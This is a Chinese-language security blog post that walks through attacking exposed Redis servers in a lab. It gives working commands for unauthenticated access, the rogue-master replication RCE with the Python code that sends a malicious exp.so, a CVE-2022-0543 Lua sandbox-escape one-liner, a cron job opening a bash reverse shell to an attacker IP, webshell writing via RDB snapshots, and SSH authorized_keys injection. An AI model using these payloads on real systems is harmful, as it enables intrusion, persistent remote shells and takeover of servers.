#  从Reids漏洞聊到getshell手法，再到计划任务和主从复制原理   
原创 麋鹿  麋鹿安全   2024-01-07 16:27  
  
本文目录  
<table><tbody><tr><td width="187" valign="top" style="word-break: break-all;">redis介绍<br/></td><td width="269" valign="top"><br/></td></tr><tr><td width="187" valign="top" style="word-break: break-all;">漏洞复现<br/></td><td width="269" valign="top" style="word-break: break-all;">4-unacc未授权</td></tr><tr><td width="187" valign="top"><br/></td><td width="269" valign="top" style="word-break: break-all;">CVE-2022-0543沙盒逃逸命令执行</td></tr><tr><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;"><span style="letter-spacing: 0.578px;text-wrap: wrap;">渗透手法</span></td><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;"><span style="letter-spacing: 0.578px;text-wrap: wrap;">计划任务getshell</span></td></tr><tr><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;" width="167"><br/></td><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;" width="249"><p><span style="letter-spacing: 0.578px;text-wrap: wrap;">写webshell</span></p><span style="display: none;line-height: 0px;">‍</span></td></tr><tr><td valign="top" colspan="1" rowspan="1"><br/></td><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;"><span style="letter-spacing: 0.578px;text-wrap: wrap;">主从复制RCE(或无损写入文件）</span></td></tr><tr><td valign="top" colspan="1" rowspan="1" width="167"><br/></td><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;" width="249">无损写文件的工具<span style="display: none;line-height: 0px;">‍</span></td></tr><tr><td valign="top" colspan="1" rowspan="1"><br/></td><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;">主从复制RCE的原理<span style="display: none;line-height: 0px;">‍</span><span style="display: none;line-height: 0px;">‍</span></td></tr><tr><td valign="top" colspan="1" rowspan="1"><br/></td><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;">写shell和计划任务的原理（快照保存）</td></tr><tr><td valign="top" colspan="1" rowspan="1" width="167"><br/></td><td valign="top" colspan="1" rowspan="1" style="word-break: break-all;" width="249">ssh公私钥免密登录</td></tr></tbody></table>  
**零-何为Redis**  
  
Redis是一个开源的内存数据库，它以键值对的方式存储数据。以下是关于 Redis 的主要特点和用途：内存存储，键值存储，持久性，数据结构支持。默认端口为6379。  
  
**壹-漏洞复现**  
  
**一-4-unacc未授权**  
  
**1.靶场搭建**  
  
可以用vulhub,但这次麋鹿自己搭的  
```
wget http://download.redis.io/releases/redis-2.8.17.tar.gz
tar xzf redis-2.8.17.tar.gz
cd redis-2.8.17
make
redis-server redis.conf
redis-cli shutdown
```  
  
  
**2.漏洞介绍**  
  
Redis默认情况下，会绑**定在0.0.0.0:637**9(在redis3.2之后，redis增加了protected-mode，在这个模式下，**非绑定IP或者没有配置密码访问**时都会报错)，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证(默认为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。  
  
攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者还可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务器登录目标服务器。  
  
**3.影响版本**  
  
2.x，3.x，4.x，5.x  
  
**4.复现**  
  
首先漏洞产生条件上面也提到了,再叙述一遍  
  
(1) Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网  
  
(2) 没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务  
  
1.扫一下6379端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5urd4duXnZfRmRCfzPhtFCPy5NI9rsBxmUnsUXO7wwEf3zh40licNzLxs54GwDabdBvO0nrIWUAAXOw/640?wx_fmt=png&from=appmsg "")  
  
2.判断漏洞是否存在  
  
kali安装连接工具  
```
wget http://download.redis.io/redis-stable.tar.gz
tar -zxvf redis-stable.tar.gz
cd redis-stable
make
```  
  
info一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5urd4duXnZfRmRCfzPhtFCPyrA5ia53lgy8kcBqwKQFl4MImYZ99jPrgf77ox3MFuiaTA5KfeEdVicPSw/640?wx_fmt=png&from=appmsg "")  
  
3.执行命令  
```
git clone https://github.com/vulhub/redis-rogue-getshell.git
cd redis-rogue-getshell/RedisModulesSDK/exp
make
cd ../../
./redis-master.py -r 192.168.1.10 -p 6379 -L 192.168.1.18 -P 8989 -f RedisModulesSDK/exp/exp.so -c "whoami"(第一个ip为靶机,第二个为kali
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5urd4duXnZfRmRCfzPhtFCPyYg6LlxKicHa04CDvhaiaFBQZ61t3Eh4ic6GrAXuialU4rkIOIpibewH3ibtQ/640?wx_fmt=png&from=appmsg "")  
  
手动也行  
```
redis-cli -h 192.168.1.10
> config set dir ./               
> config set dbfilename exp.so    
> slaveof 192.168.1.1 9999       
> module load ./exp.so          
> slaveof no one                 
> system.exec 'whoami'            
> config set dbfilename dump.rdb  
> system.exec 'rm ./exp.so'       
> module unload system
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5urd4duXnZfRmRCfzPhtFCPyibnWajJYoRcYnKepO0pADYib8BE52JUoZeltgBs812q7RM494I3DiawJw/640?wx_fmt=png&from=appmsg "")  
  
其实上述rec的手法为**主从复制RCE，原理会在后面讲到**  
  
  
  
**二-CVE-2022-0543沙盒逃逸命令执行**  
  
用的vulhub现成的  
1. 漏洞介绍  
  
Redis 嵌入了 Lua 编程语言作为其脚本引擎，可通过eval命令  
在沙箱中执行Lua脚本。  
Debian 以及 Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。  
  
Lua 初始化的末尾添加package=nil  
  
2.影响版本  
  
```
2.2 <= redis < 5.0.13
2.2 <= redis < 6.0.15
2.2 <= redis < 6.2.5
```  
  
‍  
  
3.复现流程  
  
需要知道package.loadlib的路径  
  
利用luaopen_io函数  
```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res' 0
```  
  
  
  
  
**叁-常见渗透手法**  
  
  
**1.计划任务getshell**  
  
写一个每分钟的  
```
set  xx   "\n* * * * * bash -i >& /dev/tcp/192.168.1.18/9999 0>&1\n"#每分钟一次
config set dir /var/spool/cron/#设置目录
config set dbfilename root  #快照名称为root，也就是写入/var/spool/cron/root
save
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5urd4duXnZfRmRCfzPhtFCPyHHcEaKJibibuO18zd1zMae2zvyEfmIJdnoxQnJz30GsianZEn1O8JJcLQ/640?wx_fmt=png&from=appmsg "")  
  
一分钟就回来了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5urd4duXnZfRmRCfzPhtFCPy1mL1oIscicNvYsfzSoYnol70OdicQTzOxqjyZLLhwXl0BTtCqFlHXeWg/640?wx_fmt=png&from=appmsg "")  
  
  
**2.写webshell**  
```
config set dir /www/wwwroot/1.1.1.1/
set php "\\n\\n<?php phpinfo();?>\\n\\n"
config set dbfilename 1.php
save
```  
  
为了直观有点,写个phpinfo,读者在复现时可以换为一句话  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5urd4duXnZfRmRCfzPhtFCPyPFh1O8QdOG0WibBuZx7WAAbr88ibclZCOOrPTJ6NZ3DT3hkNsuG8mXIg/640?wx_fmt=png&from=appmsg "")  
  
访问,解析了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5urd4duXnZfRmRCfzPhtFCPyHIWgIYjV2x8gmDSNXZyiaME5TWa1OxjmzaVr38uGkCyQMuLw5Uv1orA/640?wx_fmt=png&from=appmsg "")  
  
  
这里多说一句，redis创建的是 RDB 文件，写php这写文件时，文件内容里会出现一些版本信息，可能会无法解析，所以要加换行  
  
可以很清晰的看到用上述方法写文件有一个缺点--会写入一些无关的垃圾数据，为了解决该问题，下面引出主从复制的手法  
  
  
**3.主从复制RCE（或者无损写入文件）**  
  
影响版本4.x  5.x，在  
unacc未授权里以及讲过手法，故不再赘述。  
  
这里说一下  
Redis 主从复制原理  
  
主服务器是 Redis 集群中的一个节点，负责接受客户端的写操作（SET、DEL 等），并将这些写操作记录到自己的数据集中。主服务器可以有多个客户端连接，并处理它们的请求。  
  
从服务器是 Redis 集群中的节点，它通过与主服务器建立连接，订阅主服务器的操作日志（操作命令序列）。从服务器会将主服务器的操作记录在自己的数据集中，以保持与主服务器相同的数据状态。从服务器通常不接受写操作，而只允许只读查询。  
  
主从复制的过程由以下步骤组成：  
- 设置从服务器  
  
SLAVEOF [master_ip] [master_port]  
  
比如     
SLAVEOF 192.168.1.1 6379      
启动主从复制过程  
  
- 数据同步  
  
      
从服务器连接到主服务器，  
与主Redis建立Socker长连接  
  
    主Redis接收到PSYNC命令后，  
主服务器创建一个当前数据集的快照，并将其发送给从服务器  
  
     发送SYNC PSYNC开始同步  
  
      
从服务器接收快照，并加载到自己的数据存储中。  
  比如set del命令。  
- 断开连接  
  
整体过程其实就是加载一个so文件来实现getshell  
  
简单点来讲，就是  
主节点的数据会被复制到一个或多个从节点。在这个过程中，从节点会接收并执行来自主节点的所有命令以保持数据同步。  
  
  
**4.写文件的工具**  
  
推荐一个工具--  
RedisWriteFile，  
```
https://github.com/r35tart/RedisWriteFile.git
```  
  
可以用于对  
Windows 平台下写无损 EXE。其**原理是利用Redis的主从同步写数据**  
，具体点来说就是，在  
Redis 主从复制环境中插入一个假的 Redis 服务器，并与真正的 Redis 服务器（通过 Remote 类表示）来进行命令交互（也就是写文件）。  
  
再具体一点就是如下步骤  
  
1.设置一个假的主服务器，让目标机器连接到主服务器  
  
2.发送命令  
  
3.进行写文件。这里是主服务器发送一个RDB文件给从服务器（目标机器），从服务器写入。  
  
既然提到了该工具的原理，那就再聊聊主从复制RCE的原理  
  
  
**5.主从复制RCE的原理**  
  
****  
为了让读者看的更直观，麋鹿把上面主从复制RCE的命令摘选出来解读一下原理，这里的前提是已经用py脚本把exp.so上传到目标redis了  
  
忘了，应该还有一个前提--在Reids 4.x之后，Redis新增了模块功能，通过外部拓展（比如.so)，从而在redis中实现一个新的Redis命令（比如system.exec)  
```
redis-cli -h 192.168.1.10
> config set dir ./               
> config set dbfilename exp.so    
> slaveof 192.168.1.1 9999       
> module load ./exp.so           
> slaveof no one                 
> system.exec 'whoami'          
> config set dbfilename dump.rdb 
> system.exec 'rm ./exp.so'      
> module unload system
```  
  
  
第一行  
redis-cli -h 192.168.1.10的意思一目了然--连接到目标redis(靶机）  
  
第二行  
config set dir ./：    将 Redis 的数据目录设置为当前目录。这个设置快照（RDB 文件）的保存位置。  
  
第三行 将redis快照名设置为exp.so。  
  
第二行和第三行就是  
配置目标服务器的 RDB 文件路径和文件名，为了确保可以在后面的步骤中写入文件。  
  
第四行就是前面提到的，创建一个ip为  
192.168.1.1 端口为9999的redis主服务器，并把当前实例（目标redis，ip为192.1681.10）设为从服务器。  
  
五 加载当前目录下的exp.so，此时exp.so已经同步完了，192.168.1.10已经把主服务器的RDB文件（exp.so）自动复制过来了，也就是exp.so已经存在与从服务器了，所以是在192.168.1.10主机里加载。  
  
六   
slaveof no one 停止主从关系，将192.168.1.10恢复为独立的主服务器  
  
七 用exp.so提供的system.exec执行whoami命令  
  
八   
config set dbfilename dump.rdb将 Redis 快照文件名重新设置为默认的 dump.rdb  
  
九 删除exp.so  
  
十 卸载system模块  
  
整体再来走一遍，创建一个主服务器，让目标机器做为从服务器连接，发送slaveof命令以后，主服务器开始向从服务器发送之前主创建的数据库快照，从服务器收到快照以后将其加载到本地。  
  
ok，那再回头聊一下之前是如何把exp.so上传到目标服务器的。  
  
先看这条命令  
```
./redis-master.py -r 192.168.1.10 -p 6379 -L 192.168.1.18 -P 8989 -f RedisModulesSDK/exp/exp.so -c "whoami"(第一个ip为靶机,第二个为kali
```  
  
  
简单理解就是一个  
伪造数据快照的发送，实际上发送的是 exp.so 文件内容的过程，不过在讲这个过程之前，麋鹿需要先介绍一下主从之间的通讯过程。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5upsFHyz8TliaMMjfUZErViaA8jGE7jBQwK43m9EXEPbw4tIzdKQDpDR2TFB3hnh7EKG22fsZ9ZVPLDg/640?wx_fmt=png&from=appmsg "")  
  
从别的师傅文章里搬一张现成的图片，上图就是redis复制过程中的通讯情况。  
  
第一步，PING  
  
**PING**  
 是用来测试连接的命令。从服务器发送 PING 命令，期待得到 PONG 响应，以确认连接是活跃的。  
  
第二步，REPLCONF listening-port 6379：  
  
REPLCONF  
 是 Redis 用于设置复制配置的命令。这里，listening-port 6379  
 设置了复制过程中的监听端口为默认的 Redis 端口为6379。  
  
第三步，  
REPLCONF capa eof capa psync2  
  
其中 capa eof 和 capa psync2 分别是告诉主服务器，这个从服务器支持 eof（流结束）能力和 psync2 协议，这是 Redis 复制协议的一部分。  
  
四，  
PSYNC ? -1  
  
**PSYNC**命令用于同步主从服务器的数据。参数 ? -1 指示这是一个初始同步请求，从服务器请求全量数据复制。  
  
这里又涉及到  
全  
量复制和部分复制，限于本文已经有点臃肿，不再具体解释分别，字面意思理解即可。  
  
五，退出。  
  
ok，开始  
**稍微分析一下传输exp.so过程**  
  
1.  
发送 PSYNC  
 或 SYNC  
 命令，初始化数据同步完成  
  
2.  
构造一个伪造的响应。这个响应模拟了一个从服务器在接收到同步命令时的正常响应，但是其中包含了 exp.so 文件的内容。  
  
模拟正常的复制响应，发送一个 +FULLRESYNC 响应，后跟一个虚假的复制偏移量和一个空间。  
  
3.指定exp.so文件大小并发送文件内容。  
  
具体指令  
```
self.request.sendall(b'+FULLRESYNC ' + b'Z' * 40 + b' 1' + DELIMITER)
self.request.sendall(b'$' + str(len(self.server.payload)).encode() + DELIMITER)
self.request.sendall(self.server.payload + DELIMITER)
```  
  
上述指令对应功能  
  
告诉主服务器需要进行全量数据同步，并提供一个虚假的复制偏移量。  
  
指示 exp.so 文件的大小。  
  
发送 exp.so 文件的内容。  
  
伪造数据快照和发送exp,so对应代码如下，感兴趣的读者可以自行阅读。  
```
class RoguoHandler(socketserver.BaseRequestHandler):
    def handle(self):
        while True:
            data = self.request.recv(1024)
            logging.info("receive data: %r", data)
            arr = self.decode(data)
            if arr[0].startswith(b'PING'):
                self.request.sendall(b'+PONG' + DELIMITER)
            elif arr[0].startswith(b'REPLCONF'):
                self.request.sendall(b'+OK' + DELIMITER)
            elif arr[0].startswith(b'PSYNC') or arr[0].startswith(b'SYNC'):
                # 发送伪造的 FULLRESYNC 响应
                self.request.sendall(b'+FULLRESYNC ' + b'Z' * 40 + b' 1' + DELIMITER)
                # 发送 exp.so 文件大小
                self.request.sendall(b'$' + str(len(self.server.payload)).encode() + DELIMITER)
                # 发送 exp.so 文件内容
                self.request.sendall(self.server.payload + DELIMITER)
                break


        self.finish()
```  
  
  
算了，怕读者还不够清楚流程，再叨叨几句。  
  
PING对应+PONG。  
  
REPLCONF对应+OK，表示配置成功。  
  
PSYNC和SYNC表示主  
服务器开始数据同步，对应如下流程  
  
    发送一个伪造的 +FULLRESYNC 响应，后面跟随一个复制偏移量和一个文件空间大小。  
  
    发送exp.so对应的大小。  
  
    发送exp.so内容。  
  
至此，改过程是不是了然于胸了？  
  
  
  
**6.写shell和计划任务的原理（快照保存）**  
  
写webshell的原理是redis快照保存，解读一下下面这些命令的意思  
```
config set dir /www/wwwroot/1.1.1.1/
set php "\\n\\n<?php phpinfo();?>\\n\\n"
config set dbfilename 1.php
save
```  
  
第一行为设置  
Redis 服务器快照文件（RDB 文件）的目录为1.1.1.1  
  
第二行是  
在 Redis 数据库中创建一个名为 php 的键，并将其值设置为 phpinfo  
  
第三行是  
将 Redis 服务器的快照文件名设置为 1.php  
  
也就是说前三行创建了一个数据快照，内容是phpinfo，并保存在/1.1.1.1/目录下的1.php里  
  
****  
**7.ssh公私钥免密登录**  
  
```
ssh-keygen -t rsa
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > 1.txt
cat 1.txt | redis-cli -h redis地址 -p 6379 -x set crackit

redis-cli -h 192.168.1.10 -p 6379
192.168.1.10:6379> config set dir /root/.ssh/
OK
192.168.1.10:6379> config get dir
1) "dir"
2) "/root/.ssh"
192.168.1.10:6379> config set dbfilename "authorized_keys"
OK
192.168.1.10:6379> save
OK
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5urd4duXnZfRmRCfzPhtFCPyYALSMZcFwmEsmT94iamxDrekgPic1lUn1mticiagVTns67FQHe39IQ8vmw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/drOLIiakV5urd4duXnZfRmRCfzPhtFCPyueQjfQOubqZ6taB7CaROI6ULnADqsnzerlEHdB3MYutqerfJu6zszQ/640?wx_fmt=png&from=appmsg "")  
  
算了，这篇不开打赏了，开了流量也一般般。如果师傅们喜欢我们的文章，请点一个在看和赞鼓励一下我们。  
  
